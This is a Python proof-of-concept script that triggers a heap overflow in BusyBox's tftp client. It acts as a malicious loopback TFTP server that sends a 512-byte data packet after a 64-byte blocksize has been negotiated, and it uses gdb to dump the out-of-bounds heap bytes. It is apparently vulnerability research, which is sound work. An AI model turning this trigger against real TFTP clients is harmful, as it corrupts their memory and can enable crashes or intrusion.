#!/usr/bin/env python3
"""Loopback TFTP attack under gdb; inspect heap bytes after the oversized read.

Uses the non-ASan build so the process survives the corrupted write long
enough for a breakpoint at networking/tftp.c:603 (immediately after
safe_read) to print rbuf's out-of-bounds bytes.
"""
import os
import socket
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(HERE, "busybox-plain")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", 0))
sock.settimeout(20)
port = sock.getsockname()[1]

cmds = os.path.join(HERE, "gdb.cmd")
with open(cmds, "w") as f:
    f.write("set pagination off\n"
            "set confirm off\n"
            "set print elements 0\n"
            "break tftp.c:604\n"
            "run\n"
            "printf \"FIRST RBUF=%p IO_BUFSIZE=%d LEN=%d\\n\", rbuf, io_bufsize, len\n"
            "continue\n"
            "printf \"SECOND RBUF=%p IO_BUFSIZE=%d LEN=%d\\n\", rbuf, io_bufsize, len\n"
            "x/32bx rbuf+64\n"
            "x/s rbuf+68\n"
            "bt 3\n"
            "quit\n")

gdb = subprocess.Popen(
    ["gdb", "-q", "-batch", "-x", cmds, "--args", BINARY, "tftp", "-g",
     "-b", "64", "-l", os.path.join(HERE, "gdb-out.bin"), "-r", "MISHE",
     "127.0.0.1", str(port)],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=HERE)
req, peer = sock.recvfrom(2048)
print("REQ", repr(req))
payload = bytearray(((i * 7 + 0x41) & 0xFF) for i in range(512))
payload[64:72] = b"MISHE-OO"   # rbuf[68:76], first eight OOB bytes
payload[72:80] = b"TAUFTAUF"   # rbuf[76:84]
sock.sendto(struct.pack("!HH", 3, 0), peer)
time.sleep(0.15)
sock.sendto(struct.pack("!HH", 3, 1) + bytes(payload), peer)
out, _ = gdb.communicate(timeout=40)
text = out.decode("utf-8", "replace")
print(text[-5000:])
sock.close()
